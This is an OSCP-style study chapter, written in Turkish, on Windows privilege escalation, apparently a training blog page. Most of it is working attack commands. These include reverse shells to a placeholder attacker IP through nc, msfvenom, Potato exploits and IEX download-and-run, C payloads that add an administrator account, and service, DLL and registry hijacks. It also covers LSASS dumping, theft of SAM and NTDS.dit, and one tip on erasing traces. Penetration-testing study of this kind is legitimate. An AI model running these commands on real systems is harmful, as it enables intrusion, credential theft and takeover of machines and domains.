---
title: "Bölüm 4 — Windows Yetki Yükseltme"
date: 2026-10-22 14:00:00 +0300
categories: [OSCP, Privilege Escalation]
tags: [windows, privesc, potato, services, uac]
oscp: true
toc: true
permalink: /oscp/04-windows-privesc/
---
{% raw %}
Düşük yetkili bir shell'den (servis hesabı, IIS pool, MSSQL account, sıradan domain
kullanıcısı) SYSTEM / local admin'e giden yol. Kural: **önce manuel enum, sonra
otomatik araçlar** — winPEAS çıktısını okuyamayan, hiçbir vektörü anlamaz.
Bölüm sonundaki hızlı kontrol listesiyle çıkış kriterini karşıla.

**Not:** Tüm komutlarda hedef `TARGET` (veya `10.10.10.X`), kullanıcı `<KULLANICI>`,
parola `<PAROLA>` placeholder'ıdır. Kendi Kali IP'n yerine `<KALI_IP>` yaz.

## 0. Tam Etkileşimli TTY: ConPTY

**Ne / ne zaman:** WinRM/bind/reverse shell'lerde `runas`, `ssh`, interaktif
araçlar çalışmaz; tam TTY (ConPTY) gerekir. Kurulacak ilk şey budur.

```bash
# --- Saldıran taraf (Kali) ---
stty raw -echo; (stty size; cat) | nc -lvnp 3001

# --- Hedef (PowerShell) ---
IEX(IWR http://<KALI_IP>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <KALI_IP> 3001
```

**Tuzaklar / notlar:**
- TTY yoksa `runas` parola istemini kabul edemez — GUI erişimi yerine ConPTY kullan.
- `stty raw -echo` yapmadan önce terminal boyutunu (stty size) hedefe yollamayı unutma.

## 1. Sistem ve Servis Bilgisi Toplama

### 1.1 Temel manuel enum (ilk 5 dakika)

**Ne:** Sistem, kullanıcı, yetki, ağ ve süreç envanteri. Hangi vektörün mantıklı
olduğuna buranın çıktısı karar verir.

```bash
systeminfo
whoami /priv            # tehlikeli yetkiler — Bölüm 4.6'ya yönlendirir
whoami /groups          # Backup Operators / DnsAdmins / Server Operators vb.
route print
set                     # ortam değişkenleri (cmd'de)
tasklist /svc
netstat -ano            # yalnızca 127.0.0.1'de dinleyen servisler altın değerinde
query user              # oturum açmış kullanıcılar
net user && net localgroup administrators
net accounts            # parola politikası
```

**Tuzaklar / notlar:**
- `systeminfo` hotfix listelemiyorsa `wmic qfe` veya `Get-HotFix` dene.
- Netstat'ta yalnızca loopback'te dinleyen portlar (DB, yönetim konsolları) dış
  ağdan erişilemez ama yerel yetki yükseltme vektörü olabilir.

### 1.2 Sürüm, program, servis ve log envanteri

**Ne:** Kurulu programlar ve servisler hem CVE hem de ACL hataları için hedef adayıdır.

```bash
# Sürüm / build
[environment]::OSVersion.Version
Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber

# Kurulu programlar (ikisi de çalıştır — 32/64 ayrımı)
wmic product get name,version,vendor
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Çalışan servisler + binary yolu
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode | Where-Object {$_.State -like 'Running'}

# Güvenlik durumu ve kısıtlamalar
Get-MpComputerStatus                                   # Defender durumu
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

**Tuzaklar / notlar:**
- WinRM/bind shell gibi network logon'da `Get-CimInstance`/`Get-Service` servis
  sorguları "permission denied" verebilir; interaktif logon (RDP/ConPTY) çözer.
- `wmic product` her zaman tüm programları göstermez; `C:\Program Files` ve
  Desktop'ı manuel gez.

### 1.3 Otomatik enum araçları (winPEAS / PowerUp / Sherlock / WES-NG)

**Ne:** Tüm bilinen vektörleri tek seferde tarayan script'ler. Manuel enum'dan
SONRA çalıştır, bulguları manuel doğrula.

```bash
# winPEAS (en kapsamlı; çalıştırılabilir politikaya takılırsa bypass)
powershell -ep bypass
.\winPEASany.exe quiet cmd fast > peas.txt

# PowerUp (PowerSploit) — servis/ACL/register tabanlı tüm vektörler
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks
Get-ModifiableServiceFile        # yazılabilir servis binary'leri

# Sherlock / SharpUp — yerel privesc CVE kontrolü
Import-Module .\Sherlock.ps1; Find-AllVulns
.\SharpUp.exe audit

# WES-NG: systeminfo çıktısından eksik CVE listesi (Kali tarafında)
systeminfo > sysinfo.txt   # hedeften çek
wes.py sysinfo.txt
```

**Tuzaklar / notlar:**
- PowerUp/registry bulgusunda söylenen **dosyanın kendisi üzerine yazılır**; dizine
  dosya ekleyemiyorsan eski dosyayı indirip aynı isimle replace et.
- winPEAS çıktısını hedeften dışarı al ve yerelinde `grep -i "interesting"` ile tara.

## 2. Hotfix ve CVE Kontrolü

**Ne:** Eksik yamalar kernel/uygulama exploit'lerine işaret eder. Sıralama: yamaları
topla → build'e göre uygun exploit'i listele → hedef üzerinde doğrula.

```bash
# Yamalar
systeminfo
wmic qfe list brief
Get-Hotfix | ft -AutoSize

# Sürüme göre öneriler
python wes.py sysinfo.txt            # Windows Exploit Suggester - Next Generation
Import-Module .\Sherlock.ps1; Find-AllVulns
```

**Tuzaklar / notlar:**
- HTB/OffSec lab'lerinde güncel makinelerde "meşhur CVE" nadiren işler; kernel
  exploit'i **son çare** olarak dene (kararsızlık/crash riski).
- Sürüm + patch listesi + mimari (x64) üçlüsü olmadan exploit derleme; yanlış mimari
  = crash.
- Exploit bulma/uyarlama teknikleri için [Bölüm 9](/oscp/09-istemci-av/).

## 3. Servis Tabanlı Yetki Yükseltme

### 3.1 Servis binary hijacking (yazılabilir servis executable'ı)

**Ne / ne zaman:** Çalışan bir servisin `.exe`'si üzerinde yazma yetkimiz varsa,
orijinal binary'i kendi kodumuzla değiştirip servis SYSTEM olarak çalıştırınca
SYSTEM oluruz. Kullanıcı kurulumlu dizinlerde (`C:\xampp\` vb.) sık görülür.

```bash
# Çalışan servislerin yollarını listele; Windows dışı dizinlere odaklan
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls "C:\xampp\apache\bin\httpd.exe"     # (W) / (F) / (M) ara

# Yetki doğrulama (AccessChk)
accesschk64.exe -wvu "C:\Program Files\<Hedef Program>"

# Servis kilitliyse: önce taşı, sonra aynı isimde indir
move WService.exe WService.exe.bkp
move C:\Users\<KULLANICI>\rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F       # indirilen binary'e izin ver!
```

C payload (Kali'de `adduser.c` olarak kaydet):

```c
#include <stdlib.h>

int main ()
{
  int i;
  i = system ("net user <KULLANICI> <PAROLA> /add");
  i = system ("net localgroup administrators <KULLANICI> /add");
  return 0;
}
```

```bash
# Kali: cross-compile
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# Hedef: yükle + servisi yeniden başlat (ya stop/start ya reboot)
sc stop <servis> && sc start <servis>
```

**Tuzaklar / notlar:**
- Restart yetkimiz yoksa StartMode "Auto" olan servisi `shutdown /r` ile reboot
  ettir (SeShutDownPrivilege gerekir, `whoami /priv` ile kontrol et).
- `sc start` hata 1053 (timeout) döndürebilir — komut genelde YINE DE çalışmıştır; hedefi doğrula.

### 3.2 DLL hijacking

**Ne / ne zaman:** Bir uygulama/servis, bulunamayan bir DLL'yi kendisinin
olduğu dizinden önce arar (load order). Yazılabilir bir dizinde aranan DLL'nin
adıyla payload koyarız; process'i kim çalıştırırsa onun yetkisiyle çalışır.
ProcMon ile `NAME NOT FOUND` sonucu aranır (admin ister).

```bash
# ProcMon filtreleri: Process Name is <exe>  →  Result is NAME NOT FOUND
# Örn. servis C:\Temp\hijackme.dll arıyorsa ve C:\Temp yazılabilirse:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=8443 -f dll -o hijackme.dll
```

C ile DLL (alternatif; tam kontrol için):

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH:
        int i;
        i = system ("net user <KULLANICI> <PAROLA> /add");
        i = system ("net localgroup administrators <KULLANICI> /add");
        break;
        case DLL_THREAD_ATTACH:
        break;
        case DLL_THREAD_DETACH:
        break;
        case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

```bash
# Kali
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll

# Hedef: DLL'i ProcMon'da bulunan yola koy, servisi başlat
sc start <servis>
```

**Tuzaklar / notlar:**
- Windows DLL load order: uygulama dizini → System32 → 16-bit system → Windows →
  current dir → PATH dizinleri. Uygulama dizini her zaman ilk sırada.
- ProcMon admin ister; RDP/ConPTY oturumu açmadan DLL arama yapamazsın.
- msfvenom `-f dll` payload'ı x64 hedefte güvenilir şekilde çalışır.

### 3.3 Unquoted Service Path

**Ne / ne zaman:** Servis binary yolunda boşluk var ve tırnak yoksa Windows, exe'yi
soldan sağa deneyerek bulur. Ara dizinlerden birinde yazma yetkimiz varsa oraya
`<boşluktan önceki kısım>.exe` bırakırız.

```bash
# Tırnaksız, Windows dışı servisleri listele (cmd'de çalıştır, PS'de findstr bozulur)
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Örnek zafiyetli yol: C:\Program Files\My Program\My Service\service.exe
# Deneme sırası: C:\Program.exe → C:\Program Files\My.exe → ...
# Yazılabilir en sol segment'e payload koy:
msfvenom -p windows/exec CMD='net localgroup administrators <KULLANICI> /add' -f exe-service -o "C:\Program Files\My.exe"

sc stop <servis> && sc start <servis>
```

**Tuzaklar / notlar:**
- Payload adı tırnaktan ÖNCEKİ kelime + `.exe` olmalı; uzantı gerekmez, Windows ekler.
- Dizin kısa adı (8.3) ile geçemezsin çünkü Windows her zaman uzun adı denemez —
  deneme sırasındaki TAM dizin adlarına payload koy.

### 3.4 Servis yapılandırma yetkisi (zayıf servis ACL → binpath değiştirme)

**Ne / ne zaman:** Servisin kendisi üzerinde `SERVICE_ALL_ACCESS` yetkimiz varsa
binary path'i komutumuza çeviririz. `SharpUp.exe audit` / PowerUp söyler.

```bash
# Yetki kontrolü
accesschk64.exe -accepteula -quvcw <KULLANICI> *        # bana yazılabilir servisler
accesschk64.exe -qlc <servis>                            # tek servisin ACL'i

# binpath'i değiştir (komut doğrudan çalışır)
sc config <servis> binpath= "cmd /c net localgroup administrators <KULLANICI> /add" obj= LocalSystem
sc stop <servis> && sc start <servis>
```

**Tuzaklar / notlar:**
- `obj=` belirtilmezse servis mevcut hesabıyla çalışır; SYSTEM istersen `obj= LocalSystem`.
- StartService hata verebilir; komut yine çalışır — `net localgroup administrators` ile doğrula.

### 3.5 Registry servis ImagePath (permissive registry ACL)

**Ne / ne zaman:** `HKLM\SYSTEM\CurrentControlSet\services\<ad>` anahtarında
`FullControl` varsa ImagePath'i değiştiririz (örn. `NT AUTHORITY\INTERACTIVE`
üyeliğinde görülür).

```bash
Get-Acl -Path hklm:\System\CurrentControlSet\services\<servis> | fl
accesschk.exe /accepteula "<KULLANICI>" -kvuqsw hklm\System\CurrentControlSet\services

# ImagePath değiştir
reg add HKLM\SYSTEM\CurrentControlSet\services\<servis> /v ImagePath /t REG_EXPAND_SZ /d C:\Temp\x.exe /f
# veya PowerShell ile:
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\<servis> -Name "ImagePath" -Value "C:\Temp\x.exe"
sc start <servis>
```

### 3.6 Zamanlanmış görevler (Scheduled Tasks)

**Ne / ne zaman:** Task'ın çalıştırdığı dosyada yazma yetkisi varsa içeriğini değiştirip
`/run` ile hedef kullanıcının bağlamında çalıştırırız.

```bash
# Üçüncü parti görevleri listele (Microsoft/OneDrive filtreli)
schtasks /query /fo LIST | findstr /i TaskName | findstr /v /i "Microsoft\|OneDrive"

# İlginç görevin detayı: "Task To Run" + "Run As User"
schtasks /query /tn \<görev> /fo list /v
icacls <task dosyasının yolu>          # (F)/(M)/(W) var mı

# Dosyayı payload ile değiştir ve tetikle
echo c:\tools\nc64.exe -e cmd.exe <KALI_IP> 4444 > <task dosyası>
schtasks /run /tn <görev>
```

**Tuzaklar / notlar:**
- `findstr /v` zincirini doğru sırayla kullan; yoksa Microsoft görevlerinin okyanusu
  gerçek bulguyu boğar.
- Hem "Task To Run" dosyasına yazma hem de görevi çalıştırma yetkisi gerekir.

### 3.7 Startup uygulamaları (oturum açan admin'i bekleme)

**Ne:** Startup klasörüne yazılabiliyorsa, admin oturum açtığında payload'ımız
çalışır. Etkileşim gerektirir — lab'de sık değerlidir.

```bash
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# Everyone/Users için (F) görülürse:
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o x.exe
# x.exe'yi Startup klasörüne koy, admin loginini bekle
```

## 4. AlwaysInstallElevated

**Ne / ne zaman:** Her iki registry değeri de 1 ise, MSI dosyaları SYSTEM bağlamında
çalışır. Zayıf yapılandırılmış kurumsal imajlarda bulunur.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
# "AlwaysInstallElevated" = 1 (veya 0x1) İKİSİNDE de olmalı

# Sömürü
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI_IP> -f msi -o setup.msi
msiexec /quiet /qn /i C:\Temp\setup.msi

# Alternatif: PowerUp'ın hazır MSI üreteci
Write-UserAddMSI
```

**Tuzaklar / notlar:**
- Tek hive'da 1, diğerinde 0 ise çalışmaz — ikisi birden şart.
- Durum `Invoke-AllChecks` çıktısında da görünür.

## 5. Credential Avcılığı ve Saklı Kimlik Bilgileri

### 5.1 Dosya ve içerik taraması

**Ne:** Kullanıcı dizinlerinde parola barındıran yapılandırma/doküman dosyaları.

```bash
# Uzantı taraması (C:\Users altında MUTLAKA çalıştır)
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx,*.ini,*.config,*.cfg -File -Recurse -ErrorAction SilentlyContinue | Select-Object FullName
dir /a                                  # gizli dosyaları da göster

# İçerik araması (M = yalnızca dosya adı döner; kaldırırsan satır getirir)
findstr /SIM "password" *.ini *.txt *.config *.xml *.cfg
findstr /spin "password" *.*            # /p = printable olmayanı atla, /n = satır no

# Özel ilgi alanları
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
gc 'C:\Users\<KULLANICI>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

### 5.2 Unattended kurulum ve IIS

**Ne:** Kurulum otomasyon dosyalarında base64/düz metin parolalar; IIS web.config'te connection string.

```bash
type C:\Unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\system32\sysprep.inf
type C:\Windows\system32\sysprep\sysprep.xml

type C:\inetpub\wwwroot\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### 5.3 PowerShell geçmişi ve Script Block Logging

**Ne:** Kullanıcının girdiği komutlar; admin'in açık parolalı komutları burada durur.

```bash
Get-History
(Get-PSReadlineOption).HistorySavePath
gc (Get-PSReadlineOption).HistorySavePath
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt   # cmd'de

# Tüm kullanıcıların history'si
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

# Script Block Logging (Event ID 4104) — parolalı komutlar loglanır
wevtutil qe "Microsoft-Windows-PowerShell/Operational" /q:"*[System/EventID=4104]" /f:text
```

**Tuzaklar / notlar:**
- `%userprofile%` yalnızca cmd'de çalışır; PowerShell'de `$Env:userprofile` kullan.

### 5.4 Windows Credential Manager / runas /savedcred

**Ne:** Kullanıcının kaydettiği kimlik bilgileri görünmez ama `runas /savecred`
ile o hesap bağlamında komut çalıştırılır. GUI'siz ortamda parola istemini
ConPTY TTY sayesinde kullanabilirsin.

```bash
cmdkey /list
runas /savecred /user:<DOMAIN>\<KULLANICI> "c:\tools\nc.exe <KALI_IP> 4444 -e cmd"
# .ps1 dosyası IEX ile RAM'de çalıştırılabilir (diskte bırakma izi yok):
powershell "IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/nishang.ps1')"
```

**Tuzaklar / notlar:**
- Yalnızca `.ps1` dosyaları IEX ile çalıştırılır; exe'ler IEX'e uymaz.
- Stored cred varsa ama GUI yoksa runas yine de TTY (ConPTY) ister — bkz. Bölüm 0.

### 5.5 Registry'de saklı parolalar

**Ne:** Autologon, PuTTY proxy parolaları, VNC ve diğer uygulamalar registry'de
açık metin saklar.

```bash
# Autologon (açık metin!)
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# PuTTY oturum proxy parolaları
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

# Genel tarama
reg query HKEY_CURRENT_USER\ /f "Password" /s
```

### 5.6 DPAPI / Export-Clixml, Wi-Fi, KeePass, tarayıcı, LaZagne, SessionGopher

**Ne:** DPAPI ile şifrelenmiş credential'lar aynı kullanıcı/aaynı makinede
çözülebilir; parola yöneticisi veritabanları ve tarayıcı depoları offline kırılır.

```bash
# PowerShell credential (DPAPI) çözme — aynı kullanıcı bağlamında
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password

# Wi-Fi profilleri (local admin gerekir)
netsh wlan show profile
netsh wlan show profile <SSID> key=clear

# KeePass: hash çıkar + offline kır (Kali tarafında)
python keepass2john.py <dosya>.kdbx > keepass_hash
hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt

# Tarayıcı + tüm uygulamalar
.\SharpChrome.exe logins /unprotect
.\lazagne.exe all

# Uzak erişim aracı credential'ları (PuTTY/WinSCP/FileZilla/RDP)
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target TARGET
```

**Tuzaklar / notlar:**
- KeePass hash'i kırdıktan sonra veritabanını hedef dışında aç — kanıt ve temizlik kolaylaşır.
- Kırma ve hash işlemleri genel olarak [Bölüm 3](/oscp/03-parola-saldirilari/)'te.

## 6. Tehlikeli Yetkiler ve Kritik Gruplar

### 6.1 SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege — Potato ailesi

**Ne / ne zaman:** IIS, MSSQL ve benzeri servis hesaplarında varsayılan olarak
bulunur; NTLM reflection ile SYSTEM token'ı taklit edilir. **Windows yetki
yükseltmedeki en verimli vektör.**

```bash
# MSSQL bağlamı için xp_cmdshell aktif et (impacket mssqlclient ile)
enable_xp_cmdshell
xp_cmdshell whoami /priv        # SeImpersonatePrivilege Enabled mı?

# --- JuicyPotato (Win10 1809 / Server 2019 ÖNCESİ) ---
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <KALI_IP> 8443 -e cmd.exe" -t *
# nc.exe'ye TAM YOL ver; -l portu keyfi, gerekirse komutu iki kez çalıştır

# --- PrintSpoofer / RoguePotato / SigmaPotato (Win10 1809+ / Server 2019+) ---
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe <KALI_IP> 8443 -e cmd"
c:\tools\RoguePotato.exe -r <KALI_IP> -c "c:\tools\nc.exe <KALI_IP> 443 -e cmd" -l 9999
.\SigmaPotato.exe "net user <KULLANICI> <PAROLA> /add"
.\SigmaPotato.exe "net localgroup administrators <KULLANICI> /add"

# --- RogueWinRM (WinRM servisi çalışmıyorsa, HTTP.SYS üzerinden) ---
c:\tools\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe <KALI_IP> 4442"
```

**Tuzaklar / notlar:**
- JuicyPotato, Windows 10 build 1809 ve Server 2019+ çalışmaz — orada
  PrintSpoofer / RoguePotato / SigmaPotato kullan.
- `-t *` hem CreateProcessWithTokenW hem CreateProcessAsUser'ı dener; yetkiye göre
  biri çalışır.
- Çıkan shell'in `whoami`'sini mutlaka kontrol et — `nt authority\system` dönmesi gerekir.

### 6.2 SeBackupPrivilege / SeRestorePrivilege (Backup Operators)

**Ne:** Herhangi bir dosyayı ACL'i bypass ederek okuma/yazma. SAM/SYSTEM hive
yedekleme + DC'de NTDS.dit çalma için ideal.

```bash
# SAM + SYSTEM hive yedekle ve paylaşıma çek
reg save hklm\system C:\Temp\system.hive
reg save hklm\sam C:\Temp\sam.hive
impacket-smbserver -smb2support -username <KULLANICI> -password <PAROLA> public share   # Kali
copy C:\Temp\sam.hive \\<KALI_IP>\public\

secretsdump.py -sam sam.hive -system system.hive LOCAL

# DC'de NTDS.dit: diskshadow ile shadow copy
diskshadow.exe
DISKSHADOW> set context clientaccessible
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit   # SeBackupPrivilegeUtils
reg save HKLM\SYSTEM C:\Temp\SYSTEM
# Kali: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

**Tuzaklar / notlar:**
- Normal `copy` yetmez; `FILE_FLAG_BACKUP_SEMANTICS` gerekir → `Copy-FileSeBackupPrivilege` veya `robocopy /B`.
- File'da explicit DENY varsa SeBackup bile aşamaz.
- NTDS.dit çıkarma sonrası domain saldırıları [Bölüm 7](/oscp/07-ad-saldirilari/)'ye devredilir.

### 6.3 SeDebugPrivilege

**Ne:** Herhangi bir process'e attach olma — LSASS dump ile credential, veya
SYSTEM process'ten child process başlatma.

```bash
# LSASS dump → Mimikatz ile credential
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Kali'de: mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# RCE as SYSTEM: parent process token'ı inherit et (psgetsys)
tasklist                                       # SYSTEM PID bul
Import-Module .\psgetsys.ps1
ImpersonateFromParentPid -ppid <SYSTEM_PID> -command "C:\windows\system32\cmd.exe"
```

**Tuzaklar / notlar:**
- LSASS dump'ını hedeften indirip kendi Mimikatz'ında işle — hedefte iz bırakma.
- Defender/AV LSASS erişimini engelliyorsa [Bölüm 9](/oscp/09-istemci-av/) tekniklerine bak.

### 6.4 SeTakeOwnershipPrivilege (Utilman tuzağı)

**Ne:** Herhangi bir "securable object"in sahipliğini alma. Lock screen'de çalışan
Utilman.exe'yi cmd.exe ile değiştirince SYSTEM shell alınır.

```bash
# Yetkiyi enable et (token manipülasyon scriptleri)
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1

# Utilman üzerinden
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant <KULLANICI>:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
# Lock screen'de "Ease of Access" ikonuna tıkla → SYSTEM cmd
```

**Tuzaklar / notlar:**
- Sahip olmak ≠ okuyabilir; sonrasında mutlaka `icacls ... /grant :F` gerekir.
- Kendi izini sil: `reg delete HKCU\System\CurrentControlSet\Capcom` benzeri
  temizlik adımlarını unutma (denetim izi).

### 6.5 SeLoadDriverPrivilege (Print Operators → Capcom.sys)

**Ne:** Sürücü yükleme yetkisi; bilinen imzalı ama kötüye kullanılabilir bir
sürücü (Capcom.sys) yüklenip ring-0'a çıkılır.

```bash
# Yetki enable scripti derle (Visual Studio cl ile)
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

# Sürücü referansı ekle (HKCU altı — Win10 1803 sonrası ÇALIŞMAZ)
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
EnableSeLoadDriverPrivilege.exe
.\ExploitCapcom.exe          # GUI yoksa ExploitCapcom.cpp içindeki cmd.exe satırını reverse shell ile değiştir
```

**Tuzaklar / notlar:**
- Windows 10 1803+ bu vektörü kapatmıştır (HKCU sürücü referansı yok) — önce build kontrol et.

### 6.6 DNSADMINS

**Ne:** DNS servisi SYSTEM/NETWORK SERVICE benzeri yetkide çalışır; DnsAdmins
üyeleri `dnscmd` ile DNS servisine rastgele DLL yükletebilir.

```bash
# Kali
msfvenom -p windows/x64/exec cmd='net group "domain admins" <KULLANICI> /add /domain' -f dll -o adduser.dll

# Hedef — TAM YOL şart
dnscmd.exe /config /serverlevelplugindll C:\Users\<KULLANICI>\adduser.dll
sc stop dns && sc start dns      # yetki yoksa servis restartını bekle
```

**Tuzaklar / notlar:**
- Registry anahtarına doğrudan değil, yalnızca `dnscmd` ile erişilir.
- Domain ayağı [Bölüm 6](/oscp/06-ad-enumerasyon/) ve [Bölüm 7](/oscp/07-ad-saldirilari/) ile birlikte düşünülür.

### 6.7 Diğer kritik gruplar: Server Operators, Event Log Readers

```bash
# Server Operators: yerel servisleri yönetir → binpath overwrite
sc qc AppReadiness
sc config AppReadiness binPath= "cmd /c net localgroup Administrators <KULLANICI> /add"
sc start AppReadiness        # hata beklenebilir, komut çalışır

# Event Log Readers: Security logda /user geçen satırlar
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

### 6.8 Named pipe zafiyetleri

**Ne:** Everyone'a yazılabilir bir named pipe, servis hesabıyla kod çalıştırma
demektir (örn. zayıf ACL'li vendor servisleri).

```bash
pipelist.exe /accepteula
gci \\.\pipe\
accesschk.exe -accepteula -w \pipe\* -v        # Everyone'a WRITE verenleri bul
accesschk.exe -accepteula -w \pipe\<PIPE> -v
```

## 7. UAC Bypass

**Ne / ne zaman:** Kullanıcı local administrators üyesi ama "filtered token" ile
çalışıyorsa (medium integrity), yetkiler tam kullanılmaz; UAC bypass gerekir.

```bash
# UAC durumu ve seviyesi
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
# 0x5 = Always notify (en zor); 0x0/0x1/0x2 daha gevşek

# Build numarası
[environment]::OSVersion.Version

# UACME: uygun method numarasıyla payload çalıştır
msfvenom -p windows/powershell_reverse_tcp LHOST=<KALI_IP> LPORT=5555 -f exe > shell.exe
.\Akagi64.exe 53 shell.exe

# Manuel: system32'de çalışan DLL'ler (örn. srrstr.dll) için DLL hijacking
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=8443 -f dll > srrstr.dll
rundll32 shell32.dll,Control_RunDLL C:\Users\<KULLANICI>\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

**Tuzaklar / notlar:**
- Method seçimi build'e göredir; UACME method listesini sürümle eşle.
- "Always notify" seviyesinde çalışan bypass azdır — burada başka vektör ara.

## 8. LAPS

**Ne / ne zaman:** Local Administrator Password Solution kullanan domain makinelerde
yerel admin parolası AD'de (`ms-Mcs-AdmPwd` attribute) saklanır; okuma yetkisi
yönetici gruplarına verilirse domain kullanıcısıyla yerel admin parolası alınır.

```bash
# Makine LAPS kullanıyor mu
Get-ChildItem "C:\Program Files\LAPS" -ErrorAction SilentlyContinue

# Yetki varsa AD'den oku (domain-joined hedefte)
Get-ADComputer TARGET -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Alternatif (yetki sorgulama / paylaşılan yetki keşfi)
Find-LAPSDelegatedGroups
```

**Tuzaklar / notlar:**
- Okuma yetkisi olmayan kullanıcıya attribute boş/boş-gibi döner; erişim hatası
  değil sessiz boşluk gelir.
- LAPS parolası alındıysa sonraki adım pass-the-hash veya yeni oturum açma:
  [Bölüm 7](/oscp/07-ad-saldirilari/).

## 9. Kernel ve Unpatched Software (son çare)

**Ne:** Sürüm/CVE eşleşmesinden somut exploit. Lab dışında kararsızlık ve tespit
riski yüksektir; diğer vektörler tükendiyse dene.

```bash
# Örnek kalıp (CVE'ye göre değişir)
wmic product get name,version,vendor        # hedef yazılım sürümü
# uygun PoC'yi derle, hedef mimariye göre cross-compile et
```

**Tuzaklar / notlar:**
- Exploit derleme/bozuk exploit düzeltme: [Bölüm 9](/oscp/09-istemci-av/).
- Exploit öncesi hedefi yeniden doğrula: build + patch listesi + mimari.

## 10. Hızlı Kontrol Listesi (çıkış kriteri)

Sistemden ayrılmadan önce bu vektörler elle teyit edilmiş olmalı:

```text
[ ] systeminfo + wmic qfe → build/CVE eşleşmesi yapıldı mı?
[ ] whoami /priv → SeImpersonate/SeBackup/SeDebug/SeTakeOwnership var mı?
[ ] whoami /groups → Backup Operators / DnsAdmins / Server Operators / Print Operators?
[ ] Get-CimInstance win32_service → kullanıcı dizininde çalışan servis var mı?
[ ] Servis binary'lerinde yazma yetkisi (icacls/accesschk -wvu)?
[ ] Unquoted service path var mı?
[ ] Servis registry anahtarlarında FullControl var mı?
[ ] Zamanlanmış görevlerde yazılabilir "Task To Run" dosyası var mı?
[ ] Startup klasörü yazılabilir mi?
[ ] AlwaysInstallElevated her iki hive'da da 1 mi?
[ ] cmdkey /list → /savecred ile başka kullanıcıya geçiş?
[ ] Autologon / unattend.xml / PSReadline history / IIS web.config tarandı mı?
[ ] UAC seviyesi ve bypass gerekliliği belirlendi mi?
[ ] LAPS attribute okuma yetkisi var mı?
